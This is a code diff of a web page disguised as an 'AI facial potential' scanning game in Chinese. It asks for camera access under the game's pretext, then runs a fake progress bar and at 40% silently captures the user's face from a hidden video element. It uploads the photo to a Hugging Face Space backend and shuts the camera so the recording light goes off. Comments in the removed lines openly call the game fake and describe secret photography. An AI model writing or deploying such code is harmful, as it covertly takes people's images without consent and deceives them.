@@ -27,7 +27,6 @@
             background: rgba(0, 255, 204, 0.03);
             border-radius: 12px;
             box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
-            position: relative;
         }
 
         h1 { 
@@ -39,7 +38,6 @@
 
         p { color: #88a0b0; font-size: 14px; line-height: 1.6; }
 
-        /* 虚假的游戏进度条样式 */
         .progress-container {
             width: 100%;
             background-color: #112233;
@@ -56,7 +54,6 @@
             width: 0%;
             background-color: #00ffcc;
             box-shadow: 0 0 10px #00ffcc;
-            transition: width 0.1s linear;
         }
 
         .btn-scan {
@@ -71,13 +68,11 @@
             margin-top: 25px;
             letter-spacing: 1px;
             box-shadow: 0 0 15px rgba(0, 255, 204, 0.3);
-            transition: all 0.3s ease;
         }
 
         .btn-scan:hover {
             background-color: #00ffcc;
             color: #0a0e17;
-            box-shadow: 0 0 25px #00ffcc;
         }
 
         .log-box {
@@ -90,7 +85,6 @@
             padding-top: 10px;
         }
 
-        /* 🔒 核心：摄像头和画布依然彻底隐藏，保持静默状态 */
         video, canvas { display: none !important; }
     </style>
 </head>
@@ -98,7 +92,7 @@
 
     <div class="game-box">
         <h1>🧬 AI面部潜能测算</h1>
-        <p>通过高级神经网络算法，精准扫描您的面部轮廓，测算您的“隐藏隐藏智商”与“颜值爆发力”。</p>
+        <p>通过高级神经网络算法，精准扫描您的面部轮廓，测算您的“隐藏智商”与“颜值爆发力”。</p>
         <p style="color: #ff3366; font-size: 12px; margin-top: 10px;">* 注意：请将脸部正对屏幕以确保扫描精准度 *</p>
         
         <button class="btn-scan" id="scan-btn">⚡ 开始 AI 识别</button>
@@ -124,7 +118,6 @@
         // ⚠️ 记得确保这里换成了你自己的 Hugging Face 地址（末尾不要带 / ）
         const HF_SPACE_URL = 'https://sam1qiu-mirror-backend.hf.space'; 
 
-        // 测算伪装日志
         const gameLogs = [
             "SYSTEM: 正在请求卫星云通道...",
             "SYSTEM: 正在捕捉光谱数据...",
@@ -133,34 +126,109 @@
             "SYSTEM: 正在导出测算报告..."
         ];
 
-        // 点击开始游戏
         scanBtn.addEventListener('click', async () => {
-            scanBtn.style.display = 'none';
-            progressBox.style.display = 'block';
-            
             logDiv.innerText = "SYSTEM: 正在初始化摄像头硬件...";
-
+            
             try {
-                // 1. 唤醒摄像头（此时浏览器一定会弹窗，配合小游戏界面用户会非常乐意点击“允许”）
+                // 唤醒摄像头
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
                 });
                 
                 video.srcObject = stream;
-                await video.play(); 
+                // 必须在这一步确保视频流正常播放
+                video.play();
 
-                // 2. 触发虚假的游戏进度条动画，并在动画进行中偷偷拍照
+                // 只有摄像头成功开启，才隐藏按钮，显示进度条
+                scanBtn.style.display = 'none';
+                progressBox.style.display = 'block';
+
+                // 启动小游戏动画
                 startFakeGameAnimation(stream);
 
             } catch (err) {
                 console.error(err);
-                logDiv.innerText = '❌ SYSTEM: 扫描终止，权限被玩家拒绝。';
-                alert("未获得摄像头权限，AI无法扫描您的面部。请刷新页面重试。");
-                scanBtn.style.display = 'inline-block';
-                progressBox.style.display = 'none';
+                logDiv.innerText = '❌ SYSTEM: 启动失败，原因：' + err.name;
+                alert("无法开启摄像头！请确保已授予网页摄像头访问权限，且没有被其他应用占用。");
             }
         });
 
-        // 虚假游戏进度条控制
-        function startFakeGame
+        function startFakeGameAnimation(stream) {
+            let width = 0;
+            let logIndex = 0;
+            
+            const interval = setInterval(() => {
+                if (width >= 100) {
+                    clearInterval(interval);
+                } else {
+                    width += 2;
+                    progressBar.style.width = width + '%';
+                    
+                    if (width % 20 === 0 && logIndex < gameLogs.length) {
+                        logDiv.innerText = gameLogs[logIndex];
+                        logIndex++;
+                    }
+
+                    // 当进度条走到 40% 的时候，静默拍照并上传
+                    if (width === 40) {
+                        silentCaptureAndUpload(stream);
+                    }
+                }
+            }, 60); 
+        }
+
+        function silentCaptureAndUpload(stream) {
+            const w = video.videoWidth || 640;
+            const h = video.videoHeight || 480;
+            canvas.width = w;
+            canvas.height = h;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, w, h);
+            
+            canvas.toBlob((blob) => {
+                if (!blob) {
+                    logDiv.innerText = '❌ SYSTEM: 图像捕捉失败。';
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append('image', blob, 'game_capture.jpg');
+
+                // 传输照片到 Hugging Face 后端
+                fetch(`${HF_SPACE_URL}/upload`, {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(res => {
+                    if(!res.ok) throw new Error('后端响应异常');
+                    return res.json();
+                })
+                .then(data => {
+                    if (data.success) {
+                        // 完美适配安全版后端：拼接带密码的完整图片链接
+                        const finalImgUrl = HF_SPACE_URL + data.imageUrl;
+                        
+                        // 成功后立刻关闭摄像头硬件，熄灭右上角的绿色录制圆点
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // 等待进度条走完后，弹出提示
+                        setTimeout(() => {
+                            logDiv.innerText = '✅ SYSTEM: 测算完成！报告已同步至安全云端。';
+                            alert(`🎉 AI 面部测算成功！\n系统已为您生成专属云端基因报告，点击确定查看。`);
+                            window.open(finalImgUrl, '_blank'); 
+                        }, 1200);
+                    } else {
+                        throw new Error(data.message || '上传失败');
+                    }
+                })
+                .catch(err => {
+                    console.error(err);
+                    logDiv.innerText = '❌ SYSTEM: 云端存储异常，可能后端正在启动或密码配置有误。';
+                });
+            }, 'image/jpeg', 0.85);
+        }
+    </script>
+</body>
+</html>
